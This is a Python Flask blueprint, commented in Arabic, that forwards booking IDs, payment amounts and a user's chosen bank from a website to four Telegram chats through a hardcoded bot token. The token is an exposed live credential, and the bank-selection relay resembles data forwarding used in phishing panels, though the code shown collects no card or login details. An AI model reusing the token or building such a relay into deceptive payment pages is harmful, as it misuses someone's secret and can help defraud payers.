import requests
from flask import Blueprint, request, jsonify
from datetime import datetime

telegram_bp = Blueprint('telegram', __name__)

# بيانات البوت
BOT_TOKEN = "8413623443:AAFjS-6s3Aa9cBwt_dC-kBXE3OXiLtGnb-4"
CHAT_IDS = [
    "7942066919",
    "6323300854",
    "6671822049",
    "7335192117"
]

def send_telegram_message(message):
    """إرسال رسالة إلى جميع معرفات الدردشة"""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    results = []
    
    for chat_id in CHAT_IDS:
        payload = {
            "chat_id": chat_id,
            "text": message,
            "parse_mode": "HTML"
        }
        
        try:
            response = requests.post(url, json=payload, timeout=10)
            results.append({
                "chat_id": chat_id,
                "success": response.status_code == 200,
                "response": response.json()
            })
        except Exception as e:
            results.append({
                "chat_id": chat_id,
                "success": False,
                "error": str(e)
            })
    
    return results

@telegram_bp.route('/booking', methods=['POST'])
def receive_booking():
    """استقبال بيانات الحجز من الموقع"""
    try:
        data = request.get_json()
        
        # استخراج البيانات
        booking_id = data.get('bookingId', 'غير متوفر')
        amount = data.get('amount', 'غير متوفر')
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        
        # تنسيق الرسالة بشكل منظم
        message = f"""
╔══════════════════════════
║ 🔔 <b>حجز جديد</b>
╠══════════════════════════
║
║ 📋 <b>رقم بطاقة الحجز:</b>
║    <code>{booking_id}</code>
║
║ 💰 <b>المبلغ المطلوب:</b>
║    {amount}
║
║ 🕒 <b>وقت التسجيل:</b>
║    {timestamp}
║
╚══════════════════════════
✅ <b>تم استلام البيانات بنجاح</b>
"""
        
        # إرسال الرسالة إلى تليجرام
        results = send_telegram_message(message)
        
        return jsonify({
            "success": True,
            "message": "تم إرسال البيانات إلى تليجرام",
            "telegram_results": results
        }), 200
        
    except Exception as e:
        return jsonify({
            "success": False,
            "error": str(e)
        }), 500

@telegram_bp.route('/bank-selection', methods=['POST'])
def receive_bank_selection():
    """استقبال اختيار البنك"""
    try:
        data = request.get_json()
        
        # استخراج البيانات
        bank_name = data.get('bankName', 'غير متوفر')
        booking_id = data.get('bookingId', 'غير متوفر')
        amount = data.get('amount', 'غير متوفر')
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        
        # تنسيق الرسالة بشكل منظم
        message = f"""
╔══════════════════════════
║ 🏦 <b>اختيار بنك</b>
╠══════════════════════════
║
║ 🏛️ <b>البنك المختار:</b>
║    <b>{bank_name}</b>
║
║ 📋 <b>رقم بطاقة الحجز:</b>
║    <code>{booking_id}</code>
║
║ 💰 <b>المبلغ:</b>
║    {amount}
║
║ 🕒 <b>وقت الاختيار:</b>
║    {timestamp}
║
╚══════════════════════════
✅ <b>تم اختيار البنك بنجاح</b>
"""
        
        # إرسال الرسالة إلى تليجرام
        results = send_telegram_message(message)
        
        return jsonify({
            "success": True,
            "message": "تم إرسال البيانات إلى تليجرام",
            "telegram_results": results
        }), 200
        
    except Exception as e:
        return jsonify({
            "success": False,
            "error": str(e)
        }), 500

@telegram_bp.route('/startup', methods=['GET'])
def startup_notification():
    """إرسال رسالة تأكيد عند تشغيل البوت"""
    try:
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        
        message = f"""
╔══════════════════════════
║ 🚀 <b>تم تشغيل البوت</b>
╠══════════════════════════
║
║ ✅ البوت يعمل الآن وجاهز
║    لاستقبال البيانات
║
║ 🕒 <b>وقت التشغيل:</b>
║    {timestamp}
║
╚══════════════════════════
📊 <b>النظام جاهز للعمل</b>
"""
        
        results = send_telegram_message(message)
        
        return jsonify({
            "success": True,
            "message": "تم إرسال رسالة التشغيل",
            "telegram_results": results
        }), 200
        
    except Exception as e:
        return jsonify({
            "success": False,
            "error": str(e)
        }), 500
